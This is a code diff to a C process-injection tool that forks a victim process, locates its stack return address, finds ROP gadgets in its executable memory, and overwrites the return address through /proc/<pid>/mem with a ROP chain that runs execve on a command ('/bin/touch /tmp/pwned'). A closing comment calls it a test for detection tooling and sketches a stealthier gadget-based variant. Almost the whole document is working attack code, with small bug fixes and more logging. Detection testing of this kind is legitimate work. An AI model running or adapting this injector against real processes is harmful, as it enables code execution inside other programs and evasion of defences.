@@ -12,6 +12,7 @@
 char* COMMAND = "/bin/touch /tmp/pwned";
 
 #define MAX_LOOPS 100
+#define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)
 
 typedef struct {
     const uint8_t  *bytes;
@@ -24,11 +25,10 @@ pid_t create_victim_child_process() {
     if (pid < 0) {
         return 0;
     } else if (pid == 0) {
-        printf("[Victim Process]:  PID = %d\n", getpid());
         sleep(2);
         exit(0);
     }
-    sleep(0.2);
+    usleep(200000);
     return pid;
 }
 
@@ -93,7 +93,7 @@ long get_reg(pid_t pid, const char* reg) {
     int fd = open(path, O_RDONLY);
     if (fd < 0) return -1;
 
-    //try to read registers until theu became available
+    //try to read registers until they become available
     ssize_t bytesRead;
     int i=0;
     while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
@@ -104,6 +104,7 @@ long get_reg(pid_t pid, const char* reg) {
     }
 
     close(fd);
+    if (bytesRead <= 0) return -1;
     buffer[bytesRead] = '\0';
 
     long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
@@ -141,7 +142,7 @@ long find_memory_region(long pid, size_t required_len, const char *target_perms)
         char perms[5];
         if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
             
-            // has this region all the persmissio required?
+            // has this region all the permissions required?
             int has_all_perms = 1;
             for (int i = 0; target_perms[i] != '\0'; i++) {
                 if (strchr(perms, target_perms[i]) == NULL) {
@@ -188,7 +189,7 @@ long find_return_address(long pid, long rsp) {
     FILE *maps_file = fopen(maps_file_name, "r");
     if (maps_file == NULL) return -1;
 
-    int best_index = 9999; // Teniamo traccia dell'indice più vicino a RSP
+    int best_index = 9999; // Track the index closest to RSP
     long found_ret_addr_location = -1;
 
     //for every region in the memory ...
@@ -234,7 +235,7 @@ char** cmd_to_argv(const char* raw_cmd, int *out_argc) {
     char *cmd_copy = strdup(raw_cmd);
     if (!cmd_copy) return NULL;
 
-    char **argv = malloc((argc + 1) * sizeof(char*));
+    char **argv = calloc(argc + 1, sizeof(char*));
     if (!argv) return NULL;
 
     int cont = 0;
@@ -247,7 +248,7 @@ char** cmd_to_argv(const char* raw_cmd, int *out_argc) {
     argv[cont] = NULL;
 
     free(cmd_copy);
-    *out_argc = argc;
+    *out_argc = cont;
     return argv;
 }
 
@@ -267,6 +268,20 @@ long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
         return -1;
     }
 
+    size_t max_gadget_len = 0;
+    for (int i = 0; i < num_gadgets; i++) {
+        if (gadgets[i].len > max_gadget_len) {
+            max_gadget_len = gadgets[i].len;
+        }
+    }
+    size_t overlap = max_gadget_len - 1;
+    unsigned char *buffer = malloc(CHUNK_SIZE);
+    if (!buffer) {
+        fclose(maps_file);
+        close(mem_fd);
+        return -1;
+    }
+
     char line[512];
     long found = 0;
 
@@ -280,29 +295,44 @@ long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
             continue;
         
         //has the region execute permission?
-        if (perms[2] != 'x')
+        if (strchr(perms, 'x') == NULL)
             continue;
 
-        size_t size = end - start;
-        unsigned char *buffer = malloc(size);
-        if (!buffer) continue;
-        if (pread(mem_fd, buffer, size, start) != (ssize_t)size) {
-            free(buffer);
-            continue;
-        }
-
-        for (int i = 0; i < num_gadgets; i++) {
-            if (gadgets[i].addr != 0) continue;
-            unsigned char *match = memmem(buffer, size, gadgets[i].bytes, gadgets[i].len);
-            if (match) {
-                gadgets[i].addr = start + (match - buffer);
-                found++;
+        long current_addr = start;
+        while (current_addr < end) {
+            size_t bytes_to_read = end - current_addr;
+            if (bytes_to_read > CHUNK_SIZE) {
+                bytes_to_read = CHUNK_SIZE;
             }
+
+            ssize_t bytes_read = pread(mem_fd, buffer, bytes_to_read, current_addr);
+            if (bytes_read <= 0) break;
+
+            for (int i = 0; i < num_gadgets; i++) {
+                if (gadgets[i].addr != 0) continue;
+                
+                unsigned char *match = memmem(buffer, bytes_read, gadgets[i].bytes, gadgets[i].len);
+                if (match) {
+                    gadgets[i].addr = current_addr + (match - buffer);
+                    found++;
+                }
+            }
+
+            if (found == num_gadgets) {
+                free(buffer);
+                fclose(maps_file);
+                close(mem_fd);
+                return found;
+            }
+
+            if (current_addr + bytes_read < end) {
+                current_addr += (bytes_read - overlap);
+            } else
+                break; 
         }
-        free(buffer);
-        if (found == num_gadgets) break;
     }
 
+    free(buffer);
     fclose(maps_file);
     close(mem_fd);
     return found;
@@ -332,7 +362,13 @@ uint64_t* build_rop_chain_exec_cmd(pid_t pid, int* out_rop_chain_size, char* con
     uint64_t syscall_ret = gadgets[4].addr;
     uint64_t mov_mem_rdi_rax_ret = gadgets[5].addr;
 
-    printf("[*] All gadgets found\n");
+    printf("[+] All gadgets found:\n");
+    printf("    pop rdi; ret        -> 0x%lx\n", pop_rdi_ret);
+    printf("    pop rsi; ret        -> 0x%lx\n", pop_rsi_ret);
+    printf("    pop rdx; ret        -> 0x%lx\n", pop_rdx_ret);
+    printf("    pop rax; ret        -> 0x%lx\n", pop_rax_ret);
+    printf("    syscall; ret        -> 0x%lx\n", syscall_ret);
+    printf("    mov [rdi], rax; ret -> 0x%lx\n", mov_mem_rdi_rax_ret);
 
     int argc = cmd_argc;
 
@@ -345,23 +381,15 @@ uint64_t* build_rop_chain_exec_cmd(pid_t pid, int* out_rop_chain_size, char* con
     }
     int bytes_to_write = (num_chunks * 8) + (argc + 1) * 8;  // i need to write the arguments and the pointers to them to build the argv
 
-    // [Possible Improvement]: instead of writing strings and argv[] into a writable memory region,
-    // it could be possible to push everything onto the stack using two gadgets:
-    //   push rax; add rsp, 0x8; ret                    -> for intermediate chunks
-    //   push rax; mov rdi/rsi, rsp; add rsp, N; ret    -> for the final chunk of each string
-    // This would be stealthier (no writable region needed, no mov [rdi], rax pattern)
-    // but requires finding multiple rare gadgets with a variable N per string,
-    // making it unlikely to work in practice for arbitrary commands with arguments.
-
     // looking for place to write the argv
     long writable_region = find_memory_region(pid, bytes_to_write, "w");
     if(writable_region == -1) return NULL;
-    writable_region = (writable_region + 7) & ~7; // alligment
-    printf("[+] Place to write arguments and array: 0x%lx (Size: %d bytes)\n", writable_region, bytes_to_write);
+    writable_region = (writable_region + 7) & ~7; // alignment
+    printf("[+] Writable region for argv data: 0x%lx (size: %d bytes)\n", writable_region, bytes_to_write);
 
     // rop_chain allocation
-    int rop_chain_len = num_chunks * 5 +    // 5 gadget to write 8 bytes
-                        (argc + 1) * 5 +    // 5 gadget each argument pointer and the NULL terminator
+    int rop_chain_len = num_chunks * 5 +    // 5 gadgets to write 8 bytes
+                        (argc + 1) * 5 +    // 5 gadgets per argument pointer plus the NULL terminator
                         9 + 5;              // exec + exit
     uint64_t *rop_chain = malloc(rop_chain_len * sizeof(uint64_t));
     if (rop_chain == NULL) return NULL;
@@ -454,9 +482,9 @@ int main() {
         fprintf(stderr, "[-] Return address not found\n");
         exit(1);
     }
-    printf("[+] Return_address: 0x%lx\n",return_address);
+    printf("[+] Return address: 0x%lx\n",return_address);
     
-    // create argv of the command to injected
+    // create argv of the command to be injected
     int cmd_argc = 0;
     char **dyn_argv = cmd_to_argv(COMMAND, &cmd_argc);
     if (dyn_argv == NULL) {
@@ -464,15 +492,15 @@ int main() {
         exit(1);
     }
 
-    // construct a ROP chain to call mprotect and mark the memory region of our shellcode executable
-    int rop_chain_size;
+    // construct a ROP chain to invoke execve(COMMAND) on the victim
+    int rop_chain_size = 0;
     uint64_t *rop_chain = build_rop_chain_exec_cmd(pid, &rop_chain_size, dyn_argv, cmd_argc);
     for(int cont = 0; cont < cmd_argc; cont++ ) free(dyn_argv[cont]);
     if (rop_chain == NULL) {
         fprintf(stderr, "[-] Error while building the ROP chain\n");
         exit(1);
     }
-    printf("[+] ROP chain succefully built\n");
+    printf("[+] ROP chain built (%d bytes)\n", rop_chain_size);
 
 
     // overwrite the return address in the stack with the ROP chain
@@ -483,22 +511,50 @@ int main() {
         fprintf(stderr, "[-] Failed to overwrite the return address\n");
         exit(1);
     }
+    printf("[+] Return address overwritten successfully with the ROP chain\n");
 
+    unsigned char *buffer = malloc(rop_chain_size);
+    if (!buffer) {
+        fprintf(stderr, "[!] Warning: malloc failed, skipping post-overwrite dump\n");
+    } else {
+        if (read_mem(buffer, pid, return_address, rop_chain_size) != 0)
+            fprintf(stderr, "[!] Warning: failed to read memory of the ROP chain\n");
+        printf("[+] Return address location after the overwrite:\n");
+        print_mem(buffer, rop_chain_size);
+        free(buffer);
+    }
+
+    printf("[+] Injection finished\n");
     exit(0);
 }
 
 /**
- * The injector reads the victim's RSP register to map the current stack frame.
- * It then scans the stack memory to locate the exact return address of the 
- * currently executing function.
- * After it generates a ROP chain to execute commands with arguments via exec().
+ * The injector reads the victim's RSP register from /proc/<pid>/syscall
+ * to map the current stack frame. It then scans the stack memory
+ * to locate the exact return address of the currently executing function.
+ * It then generates a ROP chain to execute commands with arguments via exec().
  * (it doesn't support shell metacharacters e.g. '|', '>' or '>>' )
- * To do so it needs to locates a writable memory region, to hold all argument.
+ * To do so it needs to locate a writable memory region, to hold all arguments.
  * Here it builds the 'argv' of the command to invoke the exec syscall.
- * In the end it overwrites the return address on the victim's stack with the ROP chain
+ * Finally, it overwrites the return address on the victim's stack with the ROP chain.
  * 
  * When the victim's current function issues a 'ret' instruction, execution flow 
  * is hijacked. The ROP chain serializes the complex data structures into RAM 
  * before successfully spawning the targeted payload (e.g., "/bin/touch /tmp/pwned").
+ * 
+ * Note: this test forks a child process to use as the injection target.
+ * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
+ * where a process can only modify the memory of its own descendants.
+ * This may differ from a real-world scenario where the attacker targets an arbitrary process,
+ * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
+ * access patterns are generated regardless of the relationship between injector and target.
+ * 
+ * [Possible Improvement]: instead of writing strings and argv[] into a writable memory region,
+ * it could be possible to push everything onto the stack using two gadgets:
+ *   push rax; add rsp, 0x8; ret                    -> for intermediate chunks
+ *   push rax; mov rdi/rsi, rsp; add rsp, N; ret    -> for the final chunk of each string
+ * This would be stealthier (no writable region needed, no mov [rdi], rax pattern)
+ * but requires finding multiple rare gadgets with a variable N per string,
+ * making it unlikely to work in practice for arbitrary commands with arguments.
  * 
  */
